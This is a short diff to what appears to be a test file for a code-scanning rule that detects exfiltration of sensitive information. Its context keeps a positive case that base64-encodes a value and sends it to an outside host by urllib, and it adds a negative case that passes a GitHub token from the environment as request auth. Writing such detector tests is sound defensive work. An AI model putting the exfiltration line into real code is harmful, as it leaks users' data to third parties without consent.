@@ -98,3 +98,12 @@ def checkVersion():
         # ruleid: exfiltrate-sensitive-information
         urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
 checkVersion()
+
+
+
+
+
+
+# Should not match as we only use a single env variable
+# ok: exfiltrate-sensitive-information
+requests.get("foo", auth=(os.environ['GH_TOKEN'], 'x-oauth-basic'))
